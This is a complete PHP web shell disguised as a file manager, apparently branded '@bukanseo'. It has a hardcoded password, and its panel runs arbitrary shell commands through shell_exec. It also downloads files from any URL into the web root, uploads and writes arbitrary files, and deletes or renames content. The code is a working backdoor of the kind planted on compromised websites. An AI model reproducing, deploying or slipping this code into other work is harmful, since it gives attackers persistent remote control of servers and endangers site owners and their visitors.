<?php
session_start();

// Password default (ubah sesuai kebutuhan)
define('PASSWORD', 'BuBuDuDu');

// Fungsi encode/decode base64 URL-safe
function x($b) {
    return rtrim(strtr(base64_encode($b), '+/', '-_'), '=');
}
function y($b) {
    $b = strtr($b, '-_', '+/');
    return base64_decode($b . str_repeat('=', 3 - (3 + strlen($b)) % 4));
}

// Logout
if (isset($_GET['logout'])) {
    unset($_SESSION['logged_in']);
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit();
}

// Proses login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if ($_POST['password'] === PASSWORD) {
        $_SESSION['logged_in'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $error = "Password salah!";
    }
}

// Jika belum login tampilkan form login
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Login - File Manager</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: #111;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
            width: 350px;
            box-sizing: border-box;
            color: #fff;
        }
        h2 {
            text-align: center;
            margin-bottom: 20px;
            font-weight: 700;
            color: #00ffff;
            font-family: 'Orbitron', sans-serif;
        }
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #00ffff;
            border-radius: 4px;
            background: #222;
            color: #fff;
            font-family: 'Roboto', sans-serif;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: linear-gradient(45deg, #00ffff, #ff00ff);
            color: #fff;
            border: none;
            border-radius: 4px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            cursor: pointer;
            font-size: 14px;
            box-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff inset;
            transition: all 0.3s ease;
        }
        button:hover {
            box-shadow: 0 0 20px #00ffff, 0 0 40px #00ffff inset;
            transform: translateY(-2px);
        }
        .error {
            color: #ff5555;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
        }
    </style>
    </head>
    <body>
    <div class="login-box">
        <h2>Login</h2>
        <?php if (isset($error)) echo '<div class="error">' . htmlspecialchars($error) . '</div>'; ?>
        <form method="post" action="">
            <input type="password" name="password" placeholder="Password" required />
            <button type="submit">Login</button>
        </form>
    </div>
    </body>
    </html>
    <?php
    exit();
}

// ===================
// Setup direktori root dan current
$root = realpath($_SERVER['DOCUMENT_ROOT']);
if (!$root) $root = __DIR__; // fallback

$dir = isset($_GET['d']) ? y($_GET['d']) : $root;
$dir = realpath($dir);
if ($dir === false || strpos($dir, $root) !== 0) {
    $dir = $root;
}

chdir($dir);

$msg = '';
$errorMsg = '';
$viewFileContent = '';
$cmdOutput = '';
$activeAction = ''; // Untuk menandai aksi mana yang aktif setelah submit

// Fungsi hapus folder/file rekursif
function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (is_file($dir)) return unlink($dir);
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        deleteDirectory($dir . DIRECTORY_SEPARATOR . $file);
    }
    return rmdir($dir);
}

// Proses POST form
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Buat folder baru
    if (isset($_POST['create_folder_submit'])) {
        $activeAction = 'folder';
        if (isset($_POST['folder_name']) && $_POST['folder_name'] !== '') {
            $newFolder = $dir . DIRECTORY_SEPARATOR . basename($_POST['folder_name']);
            if (!file_exists($newFolder)) {
                if (mkdir($newFolder)) {
                    $msg = "Folder berhasil dibuat!";
                } else {
                    $errorMsg = "Gagal membuat folder.";
                }
            } else {
                $errorMsg = "Folder sudah ada.";
            }
        } else {
             $errorMsg = "Nama folder tidak boleh kosong.";
        }
    }

    // Buat/Edit file
    if (isset($_POST['create_file_submit'])) {
        $activeAction = 'file';
        if (isset($_POST['file_name']) && $_POST['file_name'] !== '') {
            $newFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
            $content = isset($_POST['file_content']) ? $_POST['file_content'] : '';
            if (file_put_contents($newFile, $content) !== false) {
                $msg = "File berhasil dibuat/diedit!";
            } else {
                $errorMsg = "Gagal membuat/mengedit file.";
            }
        } else {
            $errorMsg = "Nama file tidak boleh kosong.";
        }
    }

    // Upload file
    if (isset($_POST['upload_file_submit'])) {
        $activeAction = 'upload';
        if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
            $uploadedName = basename($_FILES['upload_file']['name']);
            $uploadPath = $dir . DIRECTORY_SEPARATOR . $uploadedName;
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $uploadPath)) {
                $msg = "File berhasil diupload!";
            } else {
                $errorMsg = "Gagal mengupload file.";
            }
        } else {
            $errorMsg = "Gagal mengupload file atau tidak ada file dipilih.";
        }
    }

    // Remote Upload
    if (isset($_POST['remote_upload_submit'])) {
        $activeAction = 'remote';
        if (isset($_POST['remote_url']) && filter_var($_POST['remote_url'], FILTER_VALIDATE_URL)) {
            $remoteUrl = $_POST['remote_url'];
            $fileName = basename($remoteUrl);
            $filePath = $dir . DIRECTORY_SEPARATOR . $fileName;

            $context = stream_context_create([
                'http' => [
                    'method' => 'GET',
                    'header' => 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
                ]
            ]);

            $fileContent = @file_get_contents($remoteUrl, false, $context);

            if ($fileContent !== false) {
                if (file_put_contents($filePath, $fileContent)) {
                    $msg = "File berhasil di-download dari URL!";
                } else {
                    $errorMsg = "Gagal menyimpan file yang di-download.";
                }
            } else {
                $errorMsg = "Gagal mengunduh file dari URL.";
            }
        } else {
            $errorMsg = "URL tidak valid.";
        }
    }

    // Hapus file/folder
    if (isset($_POST['delete_file'])) {
        $toDelete = realpath($dir . DIRECTORY_SEPARATOR . $_POST['delete_file']);
        if ($toDelete && strpos($toDelete, $root) === 0) {
            if (is_dir($toDelete)) {
                if (deleteDirectory($toDelete)) {
                    $msg = "Folder berhasil dihapus!";
                } else {
                    $errorMsg = "Gagal menghapus folder.";
                }
            } elseif (is_file($toDelete)) {
                if (unlink($toDelete)) {
                    $msg = "File berhasil dihapus!";
                } else {
                    $errorMsg = "Gagal menghapus file.";
                }
            } else {
                $errorMsg = "File/folder tidak ditemukan.";
            }
        } else {
            $errorMsg = "Path tidak valid.";
        }
    }

    // Rename file/folder
    if (isset($_POST['rename_item'], $_POST['old_name'], $_POST['new_name'])) {
        $old = realpath($dir . DIRECTORY_SEPARATOR . $_POST['old_name']);
        $new = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
        if ($old && strpos($old, $root) === 0) {
            if (!file_exists($new)) {
                if (rename($old, $new)) {
                    $msg = "Rename berhasil!";
                } else {
                    $errorMsg = "Gagal mengganti nama.";
                }
            } else {
                $errorMsg = "Nama baru sudah ada.";
            }
        } else {
            $errorMsg = "Path lama tidak valid.";
        }
    }

    // View isi file
    if (isset($_POST['view_file'])) {
        $fileToView = realpath($dir . DIRECTORY_SEPARATOR . $_POST['view_file']);
        if ($fileToView && is_file($fileToView) && strpos($fileToView, $root) === 0) {
            $viewFileContent = htmlspecialchars(file_get_contents($fileToView));
        } else {
            $errorMsg = "File tidak ditemukan atau path tidak valid.";
        }
    }

    // Jalankan perintah shell
    if (isset($_POST['shell_submit'])) {
        $activeAction = 'shell';
        if (isset($_POST['cmd_input']) && trim($_POST['cmd_input']) !== '') {
            $cmd = $_POST['cmd_input'];
            $cmdOutput = shell_exec($cmd);
            if ($cmdOutput === null) $cmdOutput = "Perintah gagal dijalankan atau tidak ada output.";
            $cmdOutput = htmlspecialchars($cmdOutput);
        } else {
            $errorMsg = "Perintah tidak boleh kosong.";
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
<title>File Manager - @bukanseo</title>
<!-- Font Awesome CDN -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<!-- Google Fonts for modern look -->
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Roboto&display=swap" rel="stylesheet">
<style>
/* Reset & base */
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}
html, body {
    height: 100%;
    font-family: 'Roboto', sans-serif;
    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
    color: #eee;
    overflow: hidden;
}
body {
    display: flex;
    flex-direction: column;
}
/* Header */
.header {
    flex-shrink: 0;
    display: flex;
    justify-content: space-between;
    align-items: center;
    background: linear-gradient(135deg, #1f4037, #99f2c8);
    padding: 15px 20px;
    color: #fff;
    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    font-family: 'Orbitron', sans-serif;
}
.header h1 {
    font-size: 1.5em;
    font-weight: 700;
}
.logout-btn {
    background: linear-gradient(45deg, #ff416c, #ff4b2b);
    border: none;
    padding: 8px 14px;
    border-radius: 5px;
    cursor: pointer;
    color: #fff;
    font-size: 14px;
    font-family: 'Orbitron', sans-serif;
    box-shadow: 0 0 15px #ff416c, 0 0 30px #ff416c inset;
    transition: all 0.3s ease;
}
.logout-btn:hover {
    box-shadow: 0 0 20px #ff4b2b, 0 0 40px #ff4b2b inset;
    transform: translateY(-2px);
}
/* Messages */
.message {
    padding: 10px 20px;
    margin: 10px 20px 0 20px;
    border-radius: 8px;
    font-weight: 600;
    font-family: 'Roboto', sans-serif;
    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
}
.msg-success {
    background-color: #2ecc71;
    color: #fff;
}
.msg-error {
    background-color: #e74c3c;
    color: #fff;
}
/* Path / Breadcrumb */
.path {
    margin: 15px 20px 10px 20px;
    font-size: 14px;
    background: rgba(255,255,255,0.1);
    padding: 10px 15px;
    border-radius: 8px;
    box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);
    backdrop-filter: blur(4px);
    display: flex;
    flex-wrap: wrap;
    align-items: center;
}
.path strong {
    margin-right: 8px;
    display: flex;
    align-items: center;
}
.path i {
    margin-right: 6px;
    color: #00ffff;
}
.path a {
    color: #00ffff;
    text-decoration: none;
    margin-right: 5px;
    font-weight: 600;
    transition: color 0.3s, text-shadow 0.3s;
}
.path a:hover {
    color: #ff00ff;
    text-shadow: 0 0 8px #ff00ff, 0 0 12px #ff00ff;
}
/* Main Content Container */
#app {
    flex: 1;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    padding: 20px;
    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
}
/* Content wrapper */
.content {
    display: flex;
    flex-direction: column;
    height: 100%;
    gap: 15px;
    overflow: auto;
}
/* Actions area */
.actions {
    background: linear-gradient(135deg, #1f4037, #99f2c8);
    padding: 15px 20px;
    border-radius: 10px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    display: flex;
    flex-direction: column;
    gap: 15px;
    font-family: 'Orbitron', sans-serif;
    transition: all 0.3s ease;
}
/* Buttons group */
.action-buttons {
    display: flex;
    flex-wrap: wrap;
    gap: 12px;
}
/* Individual action button */
.action-button {
    background: linear-gradient(135deg, #00ffff, #ff00ff);
    padding: 10px 16px;
    border: none;
    border-radius: 8px;
    color: #fff;
    font-weight: 600;
    font-family: 'Orbitron', sans-serif;
    font-size: 14px;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 8px;
    box-shadow: 0 0 15px #00ffff, 0 0 20px #00ffff inset;
    transition: all 0.3s ease, transform 0.2s;
}
.action-button i {
    font-size: 1.2em;
}
/* Hover neon glow */
.action-button:hover {
    box-shadow: 0 0 25px #00ffff, 0 0 40px #00ffff inset;
    transform: translateY(-2px);
    filter: brightness(1.1);
}
/* Active button style */
.action-button.active {
    box-shadow: 0 0 30px #ff00ff, 0 0 50px #ff00ff inset;
}
/* Action content panels */
.action-content {
    display: none;
    background: rgba(255,255,255,0.05);
    padding: 15px;
    border-radius: 8px;
    border: 1px solid #444;
    animation: fadeIn 0.4s ease;
    color: #eee;
}
.action-content.active {
    display: block;
}
@keyframes fadeIn {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
}
/* Heading inside action panels */
.action-content h2 {
    margin-bottom: 12px;
    font-size: 1.2em;
    color: #00ffff;
    border-bottom: 2px solid #00ffff;
    padding-bottom: 4px;
    font-family: 'Orbitron', sans-serif;
}
/* Forms inside action panels */
.action-content form {
    display: flex;
    flex-direction: column;
    gap: 10px;
}
/* Inputs */
.action-content input[type="text"],
.action-content input[type="file"],
.action-content textarea {
    padding: 10px;
    border-radius: 6px;
    border: 1px solid #555;
    background: #222;
    color: #eee;
    font-family: 'Roboto', sans-serif;
    font-size: 14px;
    outline: none;
    transition: border-color 0.3s, box-shadow 0.3s;
}
.action-content input[type="text"]:focus,
.action-content input[type="file"]:focus,
.action-content textarea:focus {
    border-color: #00ffff;
    box-shadow: 0 0 10px #00ffff;
}
/* Textarea specific */
textarea {
    min-height: 80px;
    resize: vertical;
}
/* Buttons inside forms */
.action-content input[type="submit"],
.action-content button {
    padding: 10px 20px;
    border: none;
    border-radius: 6px;
    background: linear-gradient(135deg, #00ffff, #ff00ff);
    color: #fff;
    font-weight: 600;
    cursor: pointer;
    font-family: 'Orbitron', sans-serif;
    font-size: 14px;
    box-shadow: 0 0 12px #00ffff, inset 0 0 12px #00ffff;
    transition: all 0.3s ease;
}
.action-content input[type="submit"]:hover,
.action-content button:hover {
    box-shadow: 0 0 20px #00ffff, inset 0 0 20px #00ffff;
    transform: translateY(-1px);
}
/* Result box for shell commands or file contents */
.result-box {
    background: rgba(0,0,0,0.3);
    border-radius: 8px;
    padding: 10px;
    margin-top: 12px;
    font-family: monospace;
    white-space: pre-wrap;
    max-height: 250px;
    overflow-y: auto;
    border: 1px solid #555;
    box-shadow: inset 0 0 10px #00ffff;
    color: #0ff;
}
/* List container for files and folders - replaced with table, so no CSS needed here for container */
table {
    width: 100%;
    border-collapse: collapse;
    font-size: 14px;
}
th, td {
    padding: 10px 12px;
    border-bottom: 1px solid #444;
    text-align: left;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    color: #ddd;
}
th {
    background: linear-gradient(135deg, #333, #555);
    color: #00ffff;
    font-weight: 600;
    border-bottom: 2px solid #00ffff;
}
td a {
    color: #00ffff;
    text-decoration: none;
    font-weight: 600;
    transition: color 0.3s, text-shadow 0.3s;
}
td a:hover {
    color: #ff00ff;
    text-shadow: 0 0 8px #ff00ff, 0 0 12px #ff00ff;
}
/* Icons for folder and file */
.fa-folder {
    color: #ffcc00;
}
.fa-file-lines {
    color: #66ccff;
}
/* Buttons for actions inside table (rename, delete) */
.action-btn, .delete-btn {
    border: none;
    padding: 6px 10px;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 600;
    font-size: 13px;
    transition: all 0.3s ease;
    display: inline-flex;
    align-items: center;
    gap: 6px;
    box-shadow: 0 0 10px #00ffff, inset 0 0 8px #00ffff;
}
.action-btn {
    background: linear-gradient(135deg, #28a745, #218838);
    color: #fff;
}
.action-btn:hover {
    box-shadow: 0 0 20px #00ffff, inset 0 0 15px #00ffff;
    transform: translateY(-1px);
}
.delete-btn {
    background: linear-gradient(135deg, #e74c3c, #c0392b);
    color: #fff;
}
.delete-btn:hover {
    box-shadow: 0 0 20px #ff4b4b, inset 0 0 15px #ff4b4b;
    transform: translateY(-1px);
}
/* Inline form elements for rename and delete buttons */
form {
    display: inline-block;
    margin-right: 8px;
}
/* Input for renaming filename */
.rename-input {
    padding: 6px 8px;
    border-radius: 6px;
    border: 1px solid #555;
    background: #222;
    color: #eee;
    font-size: 13px;
    width: 130px;
    transition: border-color 0.3s, box-shadow 0.3s;
}
.rename-input:focus {
    border-color: #00ffff;
    box-shadow: 0 0 8px #00ffff;
    outline: none;
}
/* Disable responsiveness to keep desktop view on mobile */
@media(max-width: 720px) {
    /* Optional: you can disable or comment out all responsiveness for true desktop view */
    body {
        /* padding: 10px; */
    }
    /* Optional: You may choose to remove or comment out the following media query to lock layout */
    /* But in this implementation, we will comment it out or leave empty to keep desktop mode */
}
</style>
</head>
<body>
    <div class="header">
        <h1>File Manager - @bukanseo</h1>
        <form method="get" action="">
            <button type="submit" name="logout" class="logout-btn" title="Logout"><i class="fas fa-sign-out-alt"></i></button>
        </form>
    </div>

    <?php if ($msg): ?>
        <div class="message msg-success"><?=htmlspecialchars($msg)?></div>
    <?php endif; ?>
    <?php if ($errorMsg): ?>
        <div class="message msg-error"><?=htmlspecialchars($errorMsg)?></div>
    <?php endif; ?>

    <div class="path">
        <strong><i class="fas fa-map-marker-alt"></i> Lokasi:</strong>
        <?php
        $pathParts = explode(DIRECTORY_SEPARATOR, $dir);
        $accPath = '';
        $isRoot = true;
        foreach ($pathParts as $index => $part) {
            if ($part === '') continue;
            $accPath .= ($isRoot ? '' : DIRECTORY_SEPARATOR) . $part;
            $isRoot = false;
            $encPath = x(realpath($accPath));
            if ($index === count($pathParts) - 1) {
                echo htmlspecialchars($part);
            } else {
                echo '<a href="?d=' . urlencode($encPath) . '">' . htmlspecialchars($part) . '</a> / ';
            }
        }
        if ($dir === $root) echo htmlspecialchars(basename($root));
        ?>
    </div>

    <div id="app">
        <div class="content">
            <!-- Actions Panel -->
            <div class="actions">
                <div class="action-buttons">
                    <button class="action-button" data-target="folder"><i class="fas fa-folder-plus"></i> Buat Folder</button>
                    <button class="action-button" data-target="file"><i class="fas fa-file-alt"></i> Buat / Edit File</button>
                    <button class="action-button" data-target="upload"><i class="fas fa-upload"></i> Upload File</button>
                    <button class="action-button" data-target="remote"><i class="fas fa-cloud-download-alt"></i> Remote Upload</button>
                    <button class="action-button" data-target="shell"><i class="fas fa-terminal"></i> Shell Command</button>
                </div>

                <!-- Action Panels -->
                <div id="action-folder" class="action-content">
                    <h2>Buat Folder Baru</h2>
                    <form method="post" action="">
                        <input type="text" name="folder_name" placeholder="Nama Folder" required />
                        <input type="submit" name="create_folder_submit" value="Buat Folder" />
                    </form>
                </div>

                <div id="action-file" class="action-content">
                    <h2>Buat / Edit File</h2>
                    <form method="post" action="">
                        <input type="text" name="file_name" placeholder="Nama File" required />
                        <textarea name="file_content" rows="4" placeholder="Isi file..."></textarea>
                        <input type="submit" name="create_file_submit" value="Simpan File" />
                    </form>
                </div>

                <div id="action-upload" class="action-content">
                    <h2>Upload File</h2>
                    <form method="post" enctype="multipart/form-data" action="">
                        <input type="file" name="upload_file" required />
                        <input type="submit" name="upload_file_submit" value="Upload" />
                    </form>
                </div>

                <div id="action-remote" class="action-content">
                     <h2>Remote Upload</h2>
                     <form method="post" action="">
                        <input type="text" name="remote_url" placeholder="URL file raw (mis. GitHub)" required />
                        <input type="submit" name="remote_upload_submit" value="Download" />
                    </form>
                </div>

                <div id="action-shell" class="action-content">
                    <h2>Jalankan Perintah Shell</h2>
                    <form method="post" action="">
                        <input type="text" name="cmd_input" placeholder="Masukkan perintah shell" />
                        <input type="submit" name="shell_submit" value="Jalankan" />
                    </form>
                    <?php if ($cmdOutput): ?>
                        <pre class="result-box"><?=$cmdOutput?></pre>
                    <?php endif; ?>
                </div>

                <?php if ($viewFileContent): ?>
                    <div class="action-content active"> <!-- Selalu aktif jika ada konten -->
                        <h2>Isi File</h2>
                        <pre class="result-box"><?=$viewFileContent?></pre>
                    </div>
                <?php endif; ?>
            </div>

            <!-- Daftar Folder & File dalam tabel -->
            <table>
                <thead>
                    <tr>
                        <th>Nama</th>
                        <th>Ukuran</th>
                        <th>Tipe</th>
                        <th>Aksi</th>
                    </tr>
                </thead>
                <tbody>
                <?php
                $items = scandir($dir);
                $folders = [];
                $files = [];
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
                    if (is_dir($fullPath)) {
                        $folders[] = $item;
                    } elseif (is_file($fullPath)) {
                        $files[] = $item;
                    }
                }

                if (count($folders) === 0 && count($files) === 0) {
                    echo '<tr><td colspan="4" style="text-align:center; font-style:italic;">Direktori ini kosong</td></tr>';
                }

                // Tampilkan folder
                foreach ($folders as $folder) {
                    $encPath = x($dir . DIRECTORY_SEPARATOR . $folder);
                    echo '<tr style="background: linear-gradient(135deg, #434343, #000);">';
                    echo '<td><a href="?d=' . urlencode($encPath) . '"><i class="fas fa-folder"></i> ' . htmlspecialchars($folder) . '</a></td>';
                    echo '<td>—</td>';
                    echo '<td>Folder</td>';
                    echo '<td>';
                    // Rename
                    echo '<form method="post" action="" style="display:inline-block; margin-right:8px;">';
                    echo '<input type="hidden" name="old_name" value="' . htmlspecialchars($folder) . '" />';
                    echo '<input type="text" name="new_name" class="rename-input" placeholder="Nama baru" required />';
                    echo '<button type="submit" name="rename_item" class="action-btn" title="Rename Folder"><i class="fas fa-edit"></i></button>';
                    echo '</form>';
                    // Delete
                    echo '<form method="post" action="" onsubmit="return confirm(\'Yakin ingin menghapus folder ini beserta isinya?\');" style="display:inline-block;">';
                    echo '<input type="hidden" name="delete_file" value="' . htmlspecialchars($folder) . '" />';
                    echo '<button type="submit" class="delete-btn" title="Hapus Folder"><i class="fas fa-trash"></i></button>';
                    echo '</form>';
                    echo '</td></tr>';
                }

                // Tampilkan file
                foreach ($files as $file) {
                    $filePath = $dir . DIRECTORY_SEPARATOR . $file;
                    $size = filesize($filePath);
                    $type = mime_content_type($filePath);
                    $encFile = htmlspecialchars($file);
                    $encDir = x($dir);
                    echo '<tr>';
                    echo '<td><a href="#" onclick="document.getElementById(\'viewfile_' . md5($file) . '\').submit(); return false;" title="Lihat isi file"><i class="fas fa-file-lines"></i> ' . $encFile . '</a></td>';
                    echo '<td>' . number_format($size) . ' bytes</td>';
                    echo '<td>' . htmlspecialchars($type) . '</td>';
                    echo '<td>';
                    // View File
                    echo '<form id="viewfile_' . md5($file) . '" method="post" action="" style="display:inline-block; margin-right:8px;">';
                    echo '<input type="hidden" name="view_file" value="' . htmlspecialchars($file) . '"/>';
                    echo '<button type="submit" class="action-btn" style="background-color:#3498db;" title="Lihat File"><i class="fas fa-eye"></i></button>';
                    echo '</form>';
                    // Rename
                    echo '<form method="post" action="" style="display:inline-block; margin-right:8px;">';
                    echo '<input type="hidden" name="old_name" value="' . htmlspecialchars($file) . '" />';
                    echo '<input type="text" name="new_name" class="rename-input" placeholder="Nama baru" required />';
                    echo '<button type="submit" name="rename_item" class="action-btn" title="Rename File"><i class="fas fa-edit"></i></button>';
                    echo '</form>';
                    // Delete
                    echo '<form method="post" action="" onsubmit="return confirm(\'Yakin ingin menghapus file ini?\');" style="display:inline-block;">';
                    echo '<input type="hidden" name="delete_file" value="' . htmlspecialchars($file) . '" />';
                    echo '<button type="submit" class="delete-btn" title="Hapus File"><i class="fas fa-trash"></i></button>';
                    echo '</form>';
                    echo '</td></tr>';
                }
                ?>
                </tbody>
            </table>
        </div>
    </div>
<script>
    document.addEventListener('DOMContentLoaded', () => {
        const buttons = document.querySelectorAll('.action-button');
        const contents = document.querySelectorAll('.action-content');

        function hideAll() {
            contents.forEach(c => c.classList.remove('active'));
            buttons.forEach(b => b.classList.remove('active'));
        }

        buttons.forEach(btn => {
            btn.addEventListener('click', () => {
                const targetId = 'action-' + btn.dataset.target;
                const targetEl = document.getElementById(targetId);
                if (targetEl.classList.contains('active')) {
                    hideAll();
                } else {
                    hideAll();
                    targetEl.classList.add('active');
                    btn.classList.add('active');
                }
            });
        });

        // Auto-open based on PHP variable
        const active = '<?php echo $activeAction; ?>';
        if (active) {
            const btn = document.querySelector('.action-button[data-target="'+active+'"]');
            if (btn) btn.click();
        }
        // If view file content exists, ensure panel is visible
        const viewPanel = document.querySelector('.action-content.active');
        if (!viewPanel && !active) {
            hideAll();
        }
    });
</script>
</body>
</html>